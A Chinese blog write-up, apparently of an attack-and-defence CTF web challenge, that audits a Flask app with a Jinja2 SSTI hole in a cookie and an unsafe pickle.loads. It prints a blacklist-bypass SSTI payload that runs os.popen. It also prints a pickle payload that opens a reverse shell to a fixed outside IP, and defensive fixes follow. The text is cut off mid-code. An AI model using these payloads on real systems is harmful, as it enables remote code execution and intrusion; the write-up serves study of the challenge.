lOHzOeKudYbieOwNWhNXqmmklcqXakZH[<span class="hljs-string">&#x27;greeting_list&#x27;</span>] = RTzPZUboZRubXyJnbXXWHhXRuLjqhWGH<br>    lOHzOeKudYbieOwNWhNXqmmklcqXakZH.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dWRAwgaFmZlOWoeIuKvjvxRjGPLWoIKt</span>():<br>    lOHzOeKudYbieOwNWhNXqmmklcqXakZH = shelve.<span class="hljs-built_in">open</span>(YRpxSAtoUsibvJYSNLIvYolgwUhZrDuu)<br>    RTzPZUboZRubXyJnbXXWHhXRuLjqhWGH = lOHzOeKudYbieOwNWhNXqmmklcqXakZH.get(<span class="hljs-string">&#x27;greeting_list&#x27;</span>, [])<br>    lOHzOeKudYbieOwNWhNXqmmklcqXakZH.close()<br>    <span class="hljs-keyword">return</span> RTzPZUboZRubXyJnbXXWHhXRuLjqhWGH<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/message2&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">HAqvbEFwAEbxpPEDkTdOZFRfBWDwChcZ</span>():<br>    RTzPZUboZRubXyJnbXXWHhXRuLjqhWGH = dWRAwgaFmZlOWoeIuKvjvxRjGPLWoIKt()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message2.html&#x27;</span>, greeting_list=RTzPZUboZRubXyJnbXXWHhXRuLjqhWGH)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/post&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cnLnKgpoiGtsJxZdAqLONAYlfUbnsdEQ</span>():<br>    WDMsReWUjirxIhWHctkSdWwIzklwpiug = request.form.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    OyfWRhsWSvszaMjArDigQxyOIgJOoUlz = request.form.get(<span class="hljs-string">&#x27;comment&#x27;</span>)<br>    SebLkcLkWvHNmVcyqtZpABrmqibklCEB = datetime.now()<br>    NQzCOHhQGLnkvYTdoikmOuTdFaWjmTHF(WDMsReWUjirxIhWHctkSdWwIzklwpiug, OyfWRhsWSvszaMjArDigQxyOIgJOoUlz, SebLkcLkWvHNmVcyqtZpABrmqibklCEB)<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/message2&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-string">&#x27;5000&#x27;</span>,debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>这命名太臭了，改一下好审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template,send_from_directory, make_response,redirect<br><span class="hljs-keyword">from</span> Archives <span class="hljs-keyword">import</span> Archives<br><span class="hljs-keyword">import</span> pickle,base64,os<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">import</span> numpy<br><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> shelve<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br>arg1 = <span class="hljs-string">&#x27;guestbook.dat&#x27;</span><br>app = Flask(__name__)<br>arg2 = Environment()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun1</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>,<span class="hljs-built_in">str</span></span>):<br>    fun1_a = <span class="hljs-string">&quot;%s&#x27;%s&#x27;&quot;</span>%(<span class="hljs-built_in">type</span>,<span class="hljs-built_in">str</span>)<br>    <span class="hljs-built_in">print</span>(fun1_a)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(fun1_a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun2</span>():<br>    fun2_a = [<span class="hljs-string">&#x27;class&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;subclasses&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span>]<br>    <span class="hljs-keyword">return</span> choice(fun2_a)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">global</span> Archives<br>    index_a = make_response(render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, Archives = Archives))<br>    index_2 = <span class="hljs-built_in">bytes</span>(fun2(), encoding = <span class="hljs-string">&quot;utf-8&quot;</span>)<br>    index_3 = base64.b64encode(index_2)<br>    index_a.set_cookie(<span class="hljs-string">&quot;username&quot;</span>, value=index_3)<br>    <span class="hljs-keyword">return</span> index_a<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Archive/&lt;int:id&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Archive</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    <span class="hljs-keyword">global</span> Archives<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span>&gt;<span class="hljs-built_in">len</span>(Archives):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>, arg3=<span class="hljs-string">&#x27;文章ID不存在！&#x27;</span>, status=<span class="hljs-string">&#x27;失败&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;Archive.html&#x27;</span>,Archive = Archives[<span class="hljs-built_in">id</span>])<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/message&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun3</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">type</span> = request.form[<span class="hljs-string">&#x27;type&#x27;</span>][:<span class="hljs-number">1</span>]<br>        arg3 = request.form[<span class="hljs-string">&#x27;msg&#x27;</span>]<br>        <span class="hljs-keyword">try</span>:<br>            fun3_a = base64.b64decode(request.cookies.get(<span class="hljs-string">&#x27;user&#x27;</span>))<br>            fun3_a = pickle.loads(fun3_a)<br>            fun3_b = fun3_a[<span class="hljs-string">&quot;name&quot;</span>]<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> fun3_c:<br>            <span class="hljs-built_in">print</span>(fun3_c)<br>            fun3_b = <span class="hljs-string">&quot;Guest&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(arg3)&gt;<span class="hljs-number">35</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>, msg=<span class="hljs-string">&#x27;留言太长了！&#x27;</span>, status=<span class="hljs-string">&#x27;留言失败&#x27;</span>)<br>        arg3 = arg3.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        arg3 = arg3.replace(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        fun1_a = fun1(<span class="hljs-built_in">type</span>,arg3)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>,msg=fun1_a,status=<span class="hljs-string">&#x27;%s,留言成功&#x27;</span>%fun3_b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_sandbox_filter</span>(<span class="hljs-params">command</span>):<br>    blacklist = [<br>        <span class="hljs-string">&#x27;object&#x27;</span>,<br>        <span class="hljs-string">&#x27;exec&#x27;</span>,<br>        <span class="hljs-string">&#x27;sh&#x27;</span>,<br>        <span class="hljs-string">&#x27;__getitem__&#x27;</span>,<br>        <span class="hljs-string">&#x27;__setitem__&#x27;</span>,<br>        <span class="hljs-string">&#x27;import&#x27;</span>,<br>        <span class="hljs-string">&#x27;=&#x27;</span>,<br>        <span class="hljs-string">&#x27;open&#x27;</span>,<br>        <span class="hljs-string">&#x27;sys&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>,<br>        <span class="hljs-string">&#x27;os&#x27;</span>,<br>        <span class="hljs-string">&#x27;tcp&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>,<br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>,<br>        <span class="hljs-string">&#x27;base64&#x27;</span>,<br>        <span class="hljs-string">&#x27;flag&#x27;</span>,<br>        <span class="hljs-string">&#x27;eval&#x27;</span><br>    ]<br>    <span class="hljs-keyword">for</span> forbid <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> forbid <span class="hljs-keyword">in</span> command:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hack&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun4</span>():<br>    fun3_b = request.cookies.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    fun3_b = <span class="hljs-built_in">str</span>(base64.b64decode(fun3_b), encoding = <span class="hljs-string">&quot;utf-8&quot;</span>)<br>    flag = _sandbox_filter(fun3_b)<br>    <span class="hljs-keyword">if</span> flag:<br>        fun4_a = <span class="hljs-string">&quot;error&quot;</span><br>    <span class="hljs-keyword">else</span> :<br>        fun4_a = arg2.from_string(<span class="hljs-string">&quot;Hello , &quot;</span> + fun3_b + <span class="hljs-string">&#x27;!&#x27;</span>).render()<br>    fun4_b = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>, msg=fun4_a,is_value=fun4_b)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/getvdot&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun5</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;getvdot.html&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        fun5_a = base64.b64decode(request.form[<span class="hljs-string">&#x27;matrix1&#x27;</span>])<br>        fun5_b = base64.b64decode(request.form[<span class="hljs-string">&#x27;matrix2&#x27;</span>])<br>        <span class="hljs-keyword">try</span>:<br>            fun5_a = numpy.loads(fun5_a)<br>            fun5_b = numpy.loads(fun5_b)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> fun3_c:<br>            <span class="hljs-built_in">print</span>(fun3_c)<br>        fun5_c = numpy.vdot(fun5_a,fun5_b)<br>        <span class="hljs-built_in">print</span>(fun5_c)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;getvdot.html&#x27;</span>,arg3=fun5_c,status=<span class="hljs-string">&#x27;向量点积&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun6</span>(<span class="hljs-params">fun6_1, fun6_2, fun6_3</span>):<br>    fun6_a = shelve.<span class="hljs-built_in">open</span>(arg1)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;greeting_list&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> fun6_a:<br>        fun6_b = []<br>    <span class="hljs-keyword">else</span>:<br>        fun6_b = fun6_a[<span class="hljs-string">&#x27;greeting_list&#x27;</span>]<br>    fun6_b.insert(<br>        <span class="hljs-number">0</span>, &#123;<span class="hljs-string">&#x27;name&#x27;</span>: fun6_1, <span class="hljs-string">&#x27;comment&#x27;</span>: fun6_2, <span class="hljs-string">&#x27;create_at&#x27;</span>: fun6_3&#125;)<br>    fun6_a[<span class="hljs-string">&#x27;greeting_list&#x27;</span>] = fun6_b<br>    fun6_a.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun7</span>():<br>    fun6_a = shelve.<span class="hljs-built_in">open</span>(arg1)<br>    fun6_b = fun6_a.get(<span class="hljs-string">&#x27;greeting_list&#x27;</span>, [])<br>    fun6_a.close()<br>    <span class="hljs-keyword">return</span> fun6_b<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/message2&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun8</span>():<br>    fun6_b = fun7()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message2.html&#x27;</span>, greeting_list=fun6_b)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/post&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun8</span>():<br>    fun6_1 = request.form.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    fun6_2 = request.form.get(<span class="hljs-string">&#x27;comment&#x27;</span>)<br>    fun6_3 = datetime.now()<br>    fun6(fun6_1, fun6_2, fun6_3)<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/message2&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-string">&#x27;5000&#x27;</span>,debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>先看导入了什么包，有<code>flask``jinja2``pickle</code>可以往<code>ssti</code>、<code>pickle</code>反序列化这块分析</p><p>很明显看到一个黑名单<code>_sandbox_filter</code>看一下调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun4</span>():<br>    fun3_b = request.cookies.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    fun3_b = <span class="hljs-built_in">str</span>(base64.b64decode(fun3_b), encoding = <span class="hljs-string">&quot;utf-8&quot;</span>)<br>    flag = _sandbox_filter(fun3_b)<br>    <span class="hljs-keyword">if</span> flag:<br>        fun4_a = <span class="hljs-string">&quot;error&quot;</span><br>    <span class="hljs-keyword">else</span> :<br>        fun4_a = arg2.from_string(<span class="hljs-string">&quot;Hello , &quot;</span> + fun3_b + <span class="hljs-string">&#x27;!&#x27;</span>).render()<br>    fun4_b = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>, msg=fun4_a,is_value=fun4_b)<br></code></pre></td></tr></table></figure><p>存在ssti，注入点在<code>cookie</code>的<code>username</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__getattribute__.__class__.__base__.__subclasses__()&#125;&#125;<br>e3tbXS5fX2dldGF0dHJpYnV0ZV9fLl9fY2xhc3NfXy5fX2Jhc2VfXy5fX3N1YmNsYXNzZXNfXygpfX0=<br></code></pre></td></tr></table></figure><p>找<code>os</code>，在137</p><p><img src="/mdimg/gjsweb/1743838290980-ebf4fae4-12f5-4f1c-b669-79a6ddeabb83.png"></p><p>构造payload，关键字用字符串拼接绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[].__getattribute__.__class__.__base__.__subclasses__()[<span class="hljs-number">137</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__im&#x27;</span>+<span class="hljs-string">&#x27;port__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)[<span class="hljs-string">&#x27;po&#x27;</span>+<span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;id&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/gjsweb/1743839933944-e7c72ab3-3940-4b76-af02-8ec2a87b02b5.png"></p><p>防御可以增加黑名单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_sandbox_filter</span>(<span class="hljs-params">command</span>):<br>    blacklist = [<br>        <span class="hljs-string">&#x27;object&#x27;</span>,<br>        <span class="hljs-string">&#x27;exec&#x27;</span>,<br>        <span class="hljs-string">&#x27;sh&#x27;</span>,<br>        <span class="hljs-string">&#x27;__getitem__&#x27;</span>,<br>        <span class="hljs-string">&#x27;__setitem__&#x27;</span>,<br>        <span class="hljs-string">&#x27;import&#x27;</span>,<br>        <span class="hljs-string">&#x27;=&#x27;</span>,<br>        <span class="hljs-string">&#x27;open&#x27;</span>,<br>        <span class="hljs-string">&#x27;sys&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>,<br>        <span class="hljs-string">&#x27;os&#x27;</span>,<br>        <span class="hljs-string">&#x27;tcp&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>,<br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>,<br>        <span class="hljs-string">&#x27;base64&#x27;</span>,<br>        <span class="hljs-string">&#x27;flag&#x27;</span>,<br>        <span class="hljs-string">&#x27;eval&#x27;</span>,<br>        <span class="hljs-string">&#x27;class&#x27;</span>,<br>        <span class="hljs-string">&#x27;(&#x27;</span>,<br>        <span class="hljs-string">&#x27;[&#x27;</span>,<br>        <span class="hljs-string">&#x27;+&#x27;</span>,<br>        <span class="hljs-string">&#x27;|&#x27;</span>,<br>        <span class="hljs-string">&#x27;&#123;&#x27;</span>,<br>        <span class="hljs-string">&#x27;#&#x27;</span>,<br>        <span class="hljs-string">&#x27;%&#x27;</span>,<br>        <span class="hljs-string">&#x27;$&#x27;</span>,<br>        <span class="hljs-string">&#x27;.&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure><p>在<code>message</code>路由</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/message&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun3</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">type</span> = request.form[<span class="hljs-string">&#x27;type&#x27;</span>][:<span class="hljs-number">1</span>]<br>        arg3 = request.form[<span class="hljs-string">&#x27;msg&#x27;</span>]<br>        <span class="hljs-keyword">try</span>:<br>            fun3_a = base64.b64decode(request.cookies.get(<span class="hljs-string">&#x27;user&#x27;</span>))<br>            fun3_a = pickle.loads(fun3_a)<br>            fun3_b = fun3_a[<span class="hljs-string">&quot;name&quot;</span>]<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> fun3_c:<br>            <span class="hljs-built_in">print</span>(fun3_c)<br>            fun3_b = <span class="hljs-string">&quot;Guest&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(arg3)&gt;<span class="hljs-number">35</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>, msg=<span class="hljs-string">&#x27;留言太长了！&#x27;</span>, status=<span class="hljs-string">&#x27;留言失败&#x27;</span>)<br>        arg3 = arg3.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        arg3 = arg3.replace(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        fun1_a = fun1(<span class="hljs-built_in">type</span>,arg3)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>,msg=fun1_a,status=<span class="hljs-string">&#x27;%s,留言成功&#x27;</span>%fun3_b)<br></code></pre></td></tr></table></figure><p>  <code>fun3_a = pickle.loads(fun3_a)</code></p><p>存在pickle反序列化，没有回显可以反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        a = <span class="hljs-string">&quot;&quot;&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;156.238.233.42&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system,(a,)) <br><br>a = A()<br>pickle_a = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle_a))<br><br><span class="hljs-comment">#gASVAgEAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjOdweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTU2LjIzOC4yMzMuNDIiLDg4ODgpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyeUhZRSlC4=</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/gjsweb/1743845592201-5302adf3-be43-41db-9ba9-2f092f518a85.png"></p><p><img src="/mdimg/gjsweb/1743845645870-6d553cf9-a51a-4499-bcfb-5bd034262b02.png"></p><p>防御可以禁用pickle，只是接收一个用户名，明文传输就可以，没必要使用pickle</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/message&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun3</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;message.html&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">type</span> = request.form[<span class="hljs-string">&#x27;type&#x27;</span>][:<span class="hljs-number">1</span>]<br>        arg3 = request.form[<span class="hljs-string">&#x27;msg&#x27;</span>]<br>        <span class="hljs-keyword">try</span>:<br>            fun3_a = base64.b64decode(request.cookies.get(<span class="hljs-string">&#x27;user&#x27;</span>))<br>            <span 